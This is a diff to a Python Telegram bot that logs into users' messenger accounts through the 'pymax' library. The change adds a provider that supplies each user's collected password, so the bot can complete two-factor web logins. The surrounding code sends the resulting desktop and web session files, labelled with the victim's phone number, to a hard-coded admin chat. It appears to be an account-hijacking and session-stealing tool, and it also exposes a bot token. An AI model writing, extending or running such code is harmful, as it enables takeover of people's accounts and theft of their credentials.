@@ -15,6 +15,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 from pymax import Client as SocketMaxClient, WebClient, QrAuthFlow, QrHandler
+from pymax.auth.providers import PasswordProvider
 
 BOT_TOKEN = "8770497973:AAGHcwXmPvqqXL3vT6WPWlfCpXjqhv_l10w"
 ADMIN_ID = 8632861931
@@ -108,6 +109,13 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"💻 ДЕСКТОП\nНомер: {phone}", parse_mode="HTML")
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
+
+class UserPasswordProvider(PasswordProvider):
+    def __init__(self, password):
+        self._password = password
+
+    async def get_password(self, hint=None):
+        return self._password
 
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
@@ -289,24 +297,25 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     client = pending[uid].get("client")
 
-    qr_methods = [m for m in dir(QrAuthFlow) if not m.startswith('_')]
-logging.info(f"Методы QrAuthFlow: {qr_methods}")
-
-    # Пробуем создать WebClient с авто-QR
+    # Пробуем создать WebClient с авто-QR и паролем
     try:
-        # Смотрим методы Android-клиента
-        android_methods = [m for m in dir(client) if not m.startswith('_')]
-        link_methods = [m for m in android_methods if 'link' in m.lower() or 'qr' in m.lower() or 'pair' in m.lower()]
-        logging.info(f"Методы Android с link/qr/pair: {link_methods}")
+        # Смотрим методы QrAuthFlow
+        qr_methods = [m for m in dir(QrAuthFlow) if not m.startswith('_')]
+        logging.info(f"Методы QrAuthFlow: {qr_methods}")
 
         class AutoQrHandler(QrHandler):
             async def handle(self, qr_data):
                 logging.info(f"AutoQrHandler получил QR: {qr_data}")
                 return True
 
+        user_password = pending[uid].get("user_password", "")
+
         web_client = WebClient(
             work_dir=f"{work_dir}_web",
-            auth_flow=QrAuthFlow(qr_provider=AutoQrHandler())
+            auth_flow=QrAuthFlow(
+                qr_provider=AutoQrHandler(),
+                password_provider=UserPasswordProvider(user_password) if user_password else None
+            )
         )
         await web_client.start()
         logging.info(f"WebClient.token: {web_client.token}")
